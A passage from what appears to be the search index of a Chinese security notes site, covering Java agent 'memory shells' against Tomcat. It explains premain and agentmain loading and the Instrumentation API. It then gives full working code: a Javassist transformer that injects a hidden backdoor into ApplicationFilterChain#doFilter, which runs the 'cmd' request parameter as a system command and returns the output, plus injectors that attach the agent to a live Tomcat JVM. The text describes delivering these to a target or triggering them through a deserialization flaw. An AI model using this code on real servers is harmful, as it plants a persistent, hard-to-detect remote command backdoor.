\u800c\u5728ApplicationFilterChain#doFilter\u4e2d\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86request\u548cresponse\u5c5e\u6027\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539ApplicationFilterChain#doFilter\u5b57\u8282\u7801\u5411\u5176\u5199\u5165\u5185\u5b58\u9a6c\u3002 \u5b9e\u64cd \u6211\u4eec\u5148\u5199\u597dagent\u548cTransformer\u3002 \u6211\u4eec\u62e6\u622a\u7c7bApplicationFilterChain\uff0c\u53bb\u4fee\u6539\u5b83\u7684\u65b9\u6cd5DoFilter\u3002 import java.lang.instrument.Instrumentation; public class AgentMain { public static final String ClassName = \"org.apache.catalina.core.ApplicationFilterChain\"; public static void agentmain(String agentArgs, Instrumentation ins) { ins.addTransformer(new DefineTransformer(),true); // \u83b7\u53d6\u6240\u6709\u5df2\u52a0\u8f7d\u7684\u7c7b Class[] classes = ins.getAllLoadedClasses(); for (Class clas:classes){ if (clas.getName().equals(ClassName)){ try{ // \u5bf9\u7c7b\u8fdb\u884c\u91cd\u65b0\u5b9a\u4e49 ins.retransformClasses(new Class[]{clas}); } catch (Exception e){ e.printStackTrace(); } } } } } import java.lang.instrument.ClassFileTransformer; import java.security.ProtectionDomain; import javassist.*; public class DefineTransformer implements ClassFileTransformer { public static final String ClassName = \"org.apache.catalina.core.ApplicationFilterChain\"; public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) { System.out.println(\"transform begin\"); className = className.replace(\"/\",\".\"); if (className.equals(ClassName)){ System.out.println(\"Find the Inject Class: \" + ClassName); ClassPool pool = ClassPool.getDefault(); if (classBeingRedefined != null) { //\u8fd9\u4e2a\u5730\u65b9\u5fc5\u987b\u52a0\uff0c\u5b83\u548c\u83b7\u53d6\u76f8\u5e94ClassLoader\u6709\u5173\uff0c\u4e0d\u52a0\u5c31\u6709\u53ef\u80fd\u51fa\u73b0javassist.NotFoundException \u9519\u8bef ClassClassPath classPath = new ClassClassPath(classBeingRedefined); pool.insertClassPath(classPath); } try { CtClass c = pool.getCtClass(className); CtMethod m = c.getDeclaredMethod(\"doFilter\"); m.insertBefore(\"System.out.println(321);\\n\"+ \"javax.servlet.http.HttpServletRequest req = request;\\n\" + \"javax.servlet.http.HttpServletResponse res = response;\\n\" + \"java.lang.String cmd = request.getParameter(\\\"cmd\\\");\\n\" + \"if (cmd != null){\\n\" + \" try {\\n\" + \" java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\\n\" + \" java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\\n\" + \" String line;\\n\" + \" StringBuilder sb = new StringBuilder(\\\"\\\");\\n\" + \" while ((line=reader.readLine()) != null){\\n\" + \" sb.append(line).append(\\\"\\\\n\\\");\\n\" + \" }\\n\" + \" response.getOutputStream().print(sb.toString());\\n\" + \" response.getOutputStream().flush();\\n\" + \" response.getOutputStream().close();\\n\" + \" } catch (Exception e){\\n\" + \" e.printStackTrace();\\n\" + \" }\\n\" + \"}\"); byte[] bytes = c.toBytecode(); c.detach(); return bytes; } catch (Exception e){ e.printStackTrace(); } } return new byte[0]; } } \u7136\u540e\u6253\u5305\u6210jar,\u6211\u8fd9\u91cc\u662f\u7528 \u547d\u4ee4mvn assembly:assembly\u6253\u5305\u7684\uff0cpom\u957f\u8fd9\u6837 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"> <modelVersion>4.0.0</modelVersion> <build> <plugins> <plugin> <artifactId>maven-assembly-plugin</artifactId> <configuration> <descriptorRefs> <descriptorRef>jar-with-dependencies</descriptorRef> </descriptorRefs> <archive> <manifestEntries> <Premain-Class>agen</Premain-Class> <Agent-Class>agen</Agent-Class> <Can-Redefine-Classes>true</Can-Redefine-Classes> <Can-Retransform-Classes>true</Can-Retransform-Classes> </manifestEntries> </archive> </configuration> </plugin> </plugins> </build> <groupId>groupId</groupId> <artifactId>agen</artifactId> <version>1.0-SNAPSHOT</version> <dependencies> <dependency> <groupId>javassist</groupId> <artifactId>javassist</artifactId> <version>3.12.1.GA</version> </dependency> </dependencies> </project> \u7136\u540e\u5199\u6ce8\u5165\u5668 import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class inject{ public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { String id = args[0]; String jarName = args[1]; System.out.println(\"id ==> \" + id); System.out.println(\"jarName ==> \" + jarName); VirtualMachine virtualMachine = VirtualMachine.attach(id); virtualMachine.loadAgent(jarName); virtualMachine.detach(); //\u65ad\u5f00\u4e0e\u76ee\u6807JVM\u7684\u94fe\u63a5 System.out.println(\"ends\"); } } \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u628a\u6ce8\u5165\u5668\u6253\u5305\u6210jar\uff0c\u5c06\u6ce8\u5165\u5668\u548cjavaagent\u90fd\u4e0a\u4f20\u5230\u76ee\u6807\u673a\u5668\u4e0a\uff0c\u901a\u8fc7\u6ce8\u5165\u5668\u5c06agent\u6ce8\u5165\u5230\u76ee\u6807tomcat\u4e2d\u751f\u6210filter\u5185\u5b58\u9a6c\u3002 \u4e5f\u53ef\u4ee5\u53ea\u4e0a\u4f20agent\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u63a5\u53e3\u8fdb\u884c\u547d\u4ee4\u6267\u884c\uff0c\u4ee5\u6b64\u6765\u6267\u884c\u6211\u4eec\u6ce8\u5165\u5668\u7684\u547d\u4ee4\u5c06agent\u6ce8\u5165\u5230tomcat\u4e2d\u751f\u6210filter\u5185\u5b58\u9a6c\u3002 \u5982\u679c\u51fa\u73b0\u7c7b\u627e\u4e0d\u5230\u7684\u60c5\u51b5\uff0c\u5219\u9700\u8981\u901a\u8fc7URLClassLoader+\u53cd\u5c04\u52a0\u8f7d\u6211\u4eec\u6240\u9700\u8981\u7684\u7c7b\u3002 \u8fd9\u91cc\u76f4\u63a5\u501f\u7528\u6728\u5934\u5e08\u5085\u5199\u597d\u7684 URLClassLoader+\u53cd\u5c04\u52a0\u8f7d \u7684\u6ce8\u5165\u5668 package main.java; import java.io.IOException; import java.lang.reflect.Method; import java.util.List; public class inject { public static void main(String[] args) throws Exception{ try{ java.lang.String path = \"E:\\\\tools\\\\java\\\\idea\\\\agen\\\\target\\\\agen-1.0-SNAPSHOT-jar-with-dependencies.jar\"; //\u8fd9\u91cc\u662f\u53bb\u52a0\u8f7d\u6ce8\u5165\u5668\u6240\u9700\u8981\u7684tools.jar\uff0c\u5bf9\u5e94\u7c7b\u4e3acom.sun.tools java.io.File toolsPath = new java.io.File(System.getProperty(\"java.home\").replace(\"jre\",\"lib\") + java.io.File.separator + \"tools.jar\"); java.net.URL url = toolsPath.toURI().toURL(); java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url}); Class/*<?>*/ MyVirtualMachine = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachine\"); Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachineDescriptor\"); java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod(\"list\",null); java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null); System.out.println(\"Running JVM list ...\"); for(int i=0;i<list.size();i++){ Object o = list.get(i); java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod(\"displayName\",null); java.lang.String name = (java.lang.String) displayName.invoke(o,null); System.out.println(name); // \u5217\u51fa\u5f53\u524d\u6709\u54ea\u4e9b JVM \u8fdb\u7a0b\u5728\u8fd0\u884c // \u8fd9\u91cc\u7684 if \u6761\u4ef6\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u66f4\u6539 if (name.contains(\"org.apache.catalina.startup.Bootstrap start\")){ // \u83b7\u53d6\u5bf9\u5e94\u8fdb\u7a0b\u7684 pid \u53f7 java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod(\"id\",null); java.lang.String id = (java.lang.String) getId.invoke(o,null); System.out.println(\"id >>> \" + id); java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(\"attach\",new Class[]{java.lang.String.class}); java.lang.Object vm = attach.invoke(o,new Object[]{id}); java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod(\"loadAgent\",new Class[]{java.lang.String.class}); loadAgent.invoke(vm,new Object[]{path}); java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(\"detach\",null); detach.invoke(vm,null); System.out.println(\"Agent.jar Inject Success !!\"); break; } } } catch (Exception e){ e.printStackTrace(); } } } \u8fd9\u91cc\u662f\u9009\u62e9\u628a\u6ce8\u5165\u5668\u6253\u5305\u6210jar\u7528\uff0c\u7528Manifest\u6253\u5305\uff08\u4e3b\u8981\u662fmaven\u8fd8\u6ca1\u73a9\u660e\u767d\uff09\uff0c\u4e0a\u6587\u6709\u6709\u5173Manifest\u7684\u76f8\u5173\u6b65\u9aa4\uff0c\u6240\u4ee5\u6b64\u5904\u5177\u4f53\u6b65\u9aa4\u7701\u7565\u4e86\u3002 \u7136\u540e\u901a\u8fc7\u6ce8\u5c04\u5668\u5c06agent\u6ce8\u5165\u5230tomcat\u4e2d \u5751\u70b9 \u5728transfrom\u65b9\u6cd5\u4e2d\u6211\u4eec\u5199\u4e86\u8fd9\u4e00\u6bb5\u4ee3\u7801 if (classBeingRedefined != null) { //\u8fd9\u4e2a\u5730\u65b9\u5fc5\u987b\u52a0\uff0c\u5b83\u548c\u83b7\u53d6\u76f8\u5e94ClassLoader\u6709\u5173\uff0c\u4e0d\u52a0\u5c31\u6709\u53ef\u80fd\u51fa\u73b0javassist.NotFoundException \u9519\u8bef ClassClassPath classPath = new ClassClassPath(classBeingRedefined); pool.insertClassPath(classPath); } \u5982\u679c\u4e0d\u52a0\u8fd9\u4e00\u6bb5\u7684\u8bdd\u5c31\u4f1a\u62a5\u9519 javassist.NotFoundException:org.apache.catalina.core.ApplicationFilterChain \u539f\u56e0\u662f\u8fd9\u6837\u7684 \u201cClassPool.getDefault() \u65b9\u6cd5\u7684\u641c\u7d22Classpath \u53ea\u662f\u641c\u7d22JVM\u7684\u540c\u8def\u5f84\u4e0b\u7684class\u3002\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u5728JBoss\u6216\u8005Tomcat\u4e0b\uff0cClassPool Object \u53ef\u80fd\u627e\u5230\u7528\u6237\u7684classes\u3002Javassist \u63d0\u4f9b\u4e86\u56db\u79cd\u52a8\u6001\u52a0\u8f7dclasspath\u7684\u65b9\u6cd5\u3002\u201d \u5982\u679c\u4ec5\u4ec5\u9760\u4e00\u4e2agetDefault\uff0c\u662f\u65e0\u6cd5\u83b7\u53d6\u5230tomcat\u7684\u7c7b\u7684\uff0c\u56e0\u4e3atomcat\u7684\u7c7b\u5e76\u6ca1\u6709\u5b58\u653e\u5728JVM\u540c\u8def\u5f84\u4e0b\u3002 \u8981\u89e3\u51b3\u8fd9\u4e2a\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u9996\u5148\u6211\u4eec\u770b\u4e00\u4e0btransform\u63d0\u4f9b\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u5b9a\u4e49 classBeingRedefined: if this is triggered by a redefine or retransform, the class being redefined or retransformed; if this is a class load, null \u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f\uff0c\u5982\u679c\u5f53\u524dtransform\u6240\u5904\u7406\u7684\u5bf9\u8c61\u662f\u5df2\u52a0\u8f7d\u8fc7\u7684\u7c7b\uff0c\u90a3\u4e48\u8fd9\u4e2a\u53c2\u6570\u7684\u503c\u4fbf\u662f\u5f53\u524d\u6240\u5904\u7406\u7684\u5bf9\u8c61\uff1b\u5982\u679c\u662f\u65b0\u52a0\u8f7d\u7684\u7c7b\uff0c\u5219\u4e3anull \u56e0\u4e3aorg.apache.catalina.core.ApplicationFilterChain\u5728agent\u6ce8\u5165\u65f6\u80af\u5b9a\u662f\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u4e86\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8fd9\u4e2a\u53c2\u6570\u6765\u83b7\u5f97org.apache.catalina.core.ApplicationFilterChain\u7684class\u5bf9\u8c61\uff0c\u7136\u540e\u5c06\u5176\u8bbe\u7f6e\u4e3ajavassist\u4e2dClassPool\u7684ClassPath\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u51fa\u73b0 javassist.NotFoundException\u4e86\u3002 2.maven\u6253\u5305\u7684\u4f7f\u7528\uff0c\u8fd8\u5f97\u597d\u597d\u770b\u770b\uff0c\u6298\u817e\u4e86\u597d\u534a\u5929","title":"java agent\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#java-agent","text":"","title":"java agent\u5185\u5b58\u9a6c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_1","text":"What is java agent \u542f\u52a8\u524d\u52a0\u8f7d \u64cd\u4f5c \u542f\u52a8\u540e\u52a0\u8f7d \u64cd\u4f5c \u52a8\u6001\u4fee\u6539\u5b57\u8282\u7801 addTransformer getAllLoadedClasses retransformClasses Demo agent\u5185\u5b58\u9a6c\u6ce8\u5165 \u5b9e\u64cd \u5751\u70b9","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#what-is-java-agent","text":"agent,\u662fJDK1.5\u63d0\u51fa\u7684\u4e00\u4e2a\u673a\u5236\u3002 \u5b83\u8d77\u5230\u4e86 \"\u4ee3\u7406\"\u7684\u4f5c\u7528\uff0c\u5c31\u50cfBurpSuite\u53ef\u4ee5\u5bf9\u6d4f\u89c8\u5668\u8fdb\u884c\u4ee3\u7406\u3001\u6293\u5305\uff0cjavaagent\u4e5f\u53ef\u4ee5\u5bf9java\u7a0b\u5e8f\u7684\u4fe1\u606f\u8fdb\u884c\u76d1\u63a7\u3001\u4fee\u6539\u7b49\u64cd\u4f5c\u3002 JDK1.5\u540e\u5f15\u5165\u4e86 java.lang.instrument \u5305\uff0c\u8fd9\u4e2a\u5305\u7528\u4e8e\u5b9e\u73b0javaagent\u8fd9\u4e2a\u673a\u5236\uff0c\u5b83\u91cc\u9762\u7684API\u53ef\u4ee5\u5728\u4e0d\u5f71\u54cd\u76ee\u6807java\u7a0b\u5e8f\u6b63\u5e38\u7f16\u8bd1\u7684\u60c5\u51b5\u4e0b \u52a8\u6001\u4fee\u6539\u5176\u5b57\u8282\u7801\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u52a8\u6001\u4fee\u6539\u5176\u7c7b\u3001\u65b9\u6cd5\u3001\u5c5e\u6027 \u7b49\u4fe1\u606f\u3002 javaagent\u7684\u52a0\u8f7d\u5206\u4e3a\u542f\u52a8\u524d\u52a0\u8f7d\uff08 jdk 1.5 \u4ee5\u540e\uff09\u548c\u542f\u52a8\u540e\u52a0\u8f7d\uff08jdk1.6\u4ee5\u540e\uff09\uff0c\u5206\u522b\u5bf9\u5e94\u7740premain \u65b9\u6cd5\u548cagentmain \u65b9\u6cd5\u3002","title":"What is java agent"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_2","text":"\u542f\u52a8\u524d\u52a0\u8f7d\u7684\u539f\u7406\u662f\uff1a\u5728java\u7a0b\u5e8fmain\u51fd\u6570\u6267\u884c\u524d\uff0c\u5148\u6267\u884cjava agent\u8bbe\u5b9a\u7684premain\u65b9\u6cd5\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5728JDK1.5\u88ab\u63d0\u4f9b\u4e86\u51fa\u6765\u3002","title":"\u542f\u52a8\u524d\u52a0\u8f7d"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_3","text":"\u9996\u5148\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7684\u7c7b public class test { public static void main(String[] args){ System.out.println(\"Hello World!\"); } } \u4e3a\u5176\u7f16\u5199\u6253\u5305jar\u65f6\u6240\u9700\u8981\u7684\u7684mainfest\u6587\u4ef6,test.mf\u3002\uff08\u6ce8\u610fmf\u6587\u4ef6\u4e2d\u9700\u8981\u6709\u4e00\u884c\u7a7a\u884c\uff09 Manifest-Version: 1.0 Main-Class: test \u518d\u521b\u5efa\u4e00\u4e2aagent\u7c7b import java.lang.instrument.Instrumentation; public class agen { public static void premain(String agentArgs, Instrumentation inst) throws Exception{ System.out.println(agentArgs); } } \u7f16\u5199mainfest,agen.mf Manifest-Version: 1.0 Premain-Class: agen \u7136\u540e\u6267\u884c\u4ee5\u4e0b\u6307\u4ee4\uff0c\u83b7\u5f97test.jar\u548cagen.jar \u7136\u540e\u7528\u4ee5\u4e0b\u6307\u4ee4\u5728test.jar\u7a0b\u5e8f\u6267\u884c\u524d\u5148\u6267\u884cagen.jar java -javaagent:agen.jar[=options] -jar test.jar \u53ef\u4ee5\u53d1\u73b0\u6211\u4eecpremain\u4e2d\u7684\u4ee3\u7801\u6bd4main\u4e2d\u7684\u4ee3\u7801\u4f18\u5148\u6267\u884c\u4e86\u3002","title":"\u64cd\u4f5c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_4","text":"\u542f\u52a8\u540e\u52a0\u8f7d\u539f\u7406\u662f\uff1a\u5728java\u7a0b\u5e8f\u542f\u52a8\u540e\uff0c\u4f7f\u5176\u6307\u5411\u6211\u4eec\u8bbe\u5b9a\u7684agentmain\u65b9\u6cd5\u3002agent\u5185\u5b58\u9a6c\u6ce8\u5165\u591a\u7528\u7684\u662f\u8fd9\u79cd\u65b9\u5f0f\u3002 \u8981\u5b9e\u73b0\u542f\u52a8\u540e\u52a0\u8f7d\u9700\u8981\u4e24\u4e2ajava\u6587\u4ef6\uff0c\u4e00\u4e2a\u5b9a\u4e49agentmain\u65b9\u6cd5\uff0c\u4e00\u4e2a\u8d77\u5230\u6ce8\u5165\u5668\u7684\u4f5c\u7528\u3002","title":"\u542f\u52a8\u540e\u52a0\u8f7d"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_5","text":"\u9996\u5148\u5199agen.java import java.lang.instrument.Instrumentation; public class agen{ public static void agentmain(String agentArgs, Instrumentation inst) { for (int i = 0; i < 10; i++) { System.out.println(\"agentmain gogogogo\"); } } } inject.java import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class inject{ public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { String id = args[0]; String jarName = args[1]; System.out.println(\"id ==> \" + id); System.out.println(\"jarName ==> \" + jarName); VirtualMachine virtualMachine = VirtualMachine.attach(id); virtualMachine.loadAgent(jarName); virtualMachine.detach(); //\u65ad\u5f00\u4e0e\u76ee\u6807JVM\u7684\u94fe\u63a5 System.out.println(\"ends\"); } } test.java public class test { public static void main(String[] args){ System.out.println(\"main begin!\"); while(true){ } } } \u7136\u540e\u5206\u522b\u6253\u5305\u6210jar\u5305\uff0c\u5176\u4e2dagen.java\u7684mf\u6587\u4ef6\u9700\u8981\u8fd9\u6837\u5199 Manifest-Version: 1.0 Agent-Class: agen \u8fd9\u91cc\u8f93\u5165test.jar \u542f\u52a8\u540e\u7684PID\u4ee5\u53caagentmain\u5bf9\u5e94\u7684jar\u5305 \u53ef\u4ee5\u53d1\u73b0\u786e\u5b9e\u6ce8\u5165\u4e86test.jar\uff0c\u4e14\u6267\u884c\u4e86agentmain\u91cc\u7684\u65b9\u6cd5\u3002","title":"\u64cd\u4f5c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#_6","text":"\u4e0a\u6587\u8bb2\u8ff0\u4e86agent\u7684\u6982\u5ff5\u4ee5\u53ca\u4e24\u79cd\u52a0\u8f7d\u65b9\u5f0f\uff0c\u4e0b\u9762\u4f1a\u5bf9javaagent\u4fee\u6539\u5b57\u8282\u7801\u8fd9\u4e00\u529f\u80fd\u8fdb\u884c\u8be6\u7ec6\u53d9\u8ff0\u3002 \u52a8\u6001\u4fee\u6539\u5b57\u8282\u7801\u662f\u4f7f\u7528Instrumentation\u6765\u5b9e\u73b0\u7684\uff0cjavaagent\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u4e0e\u76ee\u6807JVM\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u4fee\u6539\u5176\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u4fee\u6539\u5176\u5b57\u8282\u7801\u3002 \u8fd9\u4e2a\u7c7b\u662f\u4e00\u4e2a\u63a5\u53e3\u7c7b\uff0c\u5b83\u6709\u5982\u4e0b\u65b9\u6cd5\u3002 public interface Instrumentation { //\u589e\u52a0\u4e00\u4e2aClass\u6587\u4ef6\u8f6c\u6362\u5668 void addTransformer(ClassFileTransformer transformer); // \u5220\u9664\u4e00\u4e2a\u7c7b\u8f6c\u6362\u5668 boolean getAllLoadedClasses(ClassFileTransformer transformer); // \u5728\u7c7b\u52a0\u8f7d\u4e4b\u540e\uff0c\u91cd\u65b0\u5b9a\u4e49 Class\u3002\u8fd9\u4e2a\u5f88\u91cd\u8981\uff0c\u8be5\u65b9\u6cd5\u662f1.6 \u4e4b\u540e\u52a0\u5165\u7684\uff0c\u4e8b\u5b9e\u4e0a\uff0c\u8be5\u65b9\u6cd5\u662f update \u4e86\u4e00\u4e2a\u7c7b\u3002 void retransformClasses(Class<?>... classes) throws UnmodifiableClassException; // \u5224\u65ad\u76ee\u6807\u7c7b\u662f\u5426\u80fd\u591f\u4fee\u6539\u3002 boolean isModifiableClass(Class<?> theClass); // \u83b7\u53d6\u76ee\u6807\u5df2\u7ecf\u52a0\u8f7d\u7684\u7c7b\u3002 @SuppressWarnings(\"rawtypes\") Class[] getAllLoadedClasses(); ...... } \u5bf9\u4e8e\u4fee\u6539\u5b57\u8282\u7801\uff0c\u6bd4\u8f83\u91cd\u8981\u7684\u65b9\u6cd5\u6709addTransformer\u3001getAllLoadedClasses\u3001retransformClasses \u7b49\u3002 \u5bf9\u4e8e\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u6709\u4e00\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u6982\u5ff5\u662fTransformer\uff0c\u5b83\u4f1a\u62e6\u622a\u5df2\u52a0\u8f7d\u7684\u6216\u8005\u6b63\u5728\u52a0\u8f7d\u7684\u7c7b\uff0c\u5e76\u4ea4\u7531\u5185\u90e8\u7684transfrom\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\uff0c\u51ed\u6b64\u53ef\u4ee5\u7528\u4e8e\u4fee\u6539class\u6587\u4ef6\u7684\u5b57\u8282\u7801\u3002 \u53e6\u5916\uff0c\u60f3\u8981\u8ba9agent\u7c7b\u80fd\u591f\u5b9e\u73b0\u4fee\u6539\u5b57\u8282\u7801\u7b49\u64cd\u4f5c\uff0c\u9700\u8981\u5728mf\u4e2d\u589e\u52a0\u4ee5\u4e0b\u884c\uff0c\u82e5\u6ca1\u6709\u4ee5\u4e0b\u914d\u7f6e\u5219\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62a5\u9519\u3002 Can-Redefine-Classes: true Can-Retransform-Classes: true","title":"\u52a8\u6001\u4fee\u6539\u5b57\u8282\u7801"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#addtransformer","text":"\u901a\u8fc7\u8be5\u65b9\u6cd5\u6765\u6ce8\u518cTransformer\uff0c\u6211\u4eec\u8ddf\u8fdbClassFileTransformer\u7c7b\u6765\u4e00\u7aa5Transformer\u7684\u6a21\u6837\u3002 \u53ef\u4ee5\u53d1\u73b0\u5b83\u4e5f\u662f\u4e00\u4e2a\u63a5\u53e3\u7c7b\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u7ee7\u627f\u4e8e\u5b83\u7684Transformer\u53bb\u5b9e\u73b0\u5b83\u7684transform\u65b9\u6cd5. \u8fd9\u4e2atransform\u8fd4\u56de\u7ed3\u679c\u5373\u8f6c\u6362\u540e\u7684\u5b57\u8282\u7801\u3002 Transformer\u4f1a\u62e6\u622a\u5df2\u52a0\u8f7d\u7684\u6216\u8005\u6b63\u5728\u52a0\u8f7d\u7684\u7c7b\uff0c\u5e76\u4ea4\u7531\u5185\u90e8\u7684transfrom\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\u3002 \u6211\u4eec\u8fd9\u91cc\u5199\u4e2a\u5c0fdemo\u6765\u8f93\u51fa\u6240\u6709\u88abTransformer\u62e6\u622a\u7684\u7c7b\u3002 import java.lang.instrument.Instrumentation; public class agen{ public static void agentmain(String agentArgs, Instrumentation inst) { inst.addTransformer(new DefineTransformer(),true); System.out.println(\"agent gogo\"); Class[] classes = inst.getAllLoadedClasses(); for(Class clas:classes){ System.out.println(clas.getName()); } } } import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; public class DefineTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { System.out.println(className); return new byte[0]; } }","title":"addTransformer"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#getallloadedclasses","text":"\u8be5\u65b9\u6cd5\u53ef\u4ee5\u5217\u51fa\u6240\u6709\u5df2\u52a0\u8f7d\u7684class\uff0c\u5e76\u4ee5\u6570\u7ec4\u5f62\u5f0f\u8fd4\u56de\u3002 import java.lang.instrument.Instrumentation; public class agen{ public static void agentmain(String agentArgs, Instrumentation inst) { System.out.println(\"agent gogo\"); Class[] classes = inst.getAllLoadedClasses(); for(Class clas:classes){ System.out.println(clas.getName()); } } }","title":"getAllLoadedClasses"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/#retransformclasses","text":"\u8fd9\u4e2a\u65b9\u6cd5\u80fd\u5bf9\u5df2\u52a0\u8f7d\u7684class\u8fdb\u884c\u91cd\u65b0\u5b9a\u4e49\uff0c\u53ef\u4ee5\u914d\u5408getAllLoadedClasses\u65b9\u6cd5\u6765\u91cd\u65b0\u5b9a\u4e49\u5df2\u52a0\u8f7d\u5bf9\u8c61\u3002 \u5177\u4f53\u662f\u5c06\u5df2\u52a0\u8f7d\u5bf9\u8c61\u62e6\u622a\uff0c\u4ea4\u7531Transformer#transform 